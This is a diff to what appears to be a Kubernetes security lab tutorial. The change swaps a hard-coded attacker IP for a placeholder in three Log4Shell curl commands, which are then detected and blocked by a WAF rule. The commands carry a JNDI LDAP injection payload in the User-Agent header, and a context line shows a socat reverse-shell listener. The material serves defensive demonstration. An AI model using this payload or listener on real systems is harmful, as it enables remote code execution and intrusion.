@@ -117,7 +117,7 @@ socat file:`tty`,raw,echo=0 tcp-listen:4444
 Run attack
 
 ```
-curl http://sample-app.default.10.65.0.209.sslip.io/login -d "uname=test&password=invalid" -H 'User-Agent: ${jndi:ldap://18.198.55.208:1389/a}'
+curl http://sample-app.default.10.65.0.209.sslip.io/login -d "uname=test&password=invalid" -H 'User-Agent: ${jndi:ldap://<IP>:1389/a}'
 ```
 
 Install kubectl
@@ -267,7 +267,7 @@ See that the remote shell does not work anymore and the connection was denied in
 Execute
 
 ```
-curl http://sample-app.default.10.65.0.209.sslip.io/login -d "uname=test&password=invalid" -H 'User-Agent: ${jndi:ldap://18.198.55.208:1389/a}'
+curl http://sample-app.default.10.65.0.209.sslip.io/login -d "uname=test&password=invalid" -H 'User-Agent: ${jndi:ldap://<IP>:1389/a}'
 ```
 
 and see the security event.
@@ -277,7 +277,7 @@ Add a log4shell WAF rule to block the log4shell attack.
 Execute
 
 ```
-curl http://sample-app.default.10.65.0.209.sslip.io/login -d "uname=test&password=invalid" -H 'User-Agent: ${jndi:ldap://18.198.55.208:1389/a}'
+curl http://sample-app.default.10.65.0.209.sslip.io/login -d "uname=test&password=invalid" -H 'User-Agent: ${jndi:ldap://<IP>:1389/a}'
 ```
 
 and see the security event.
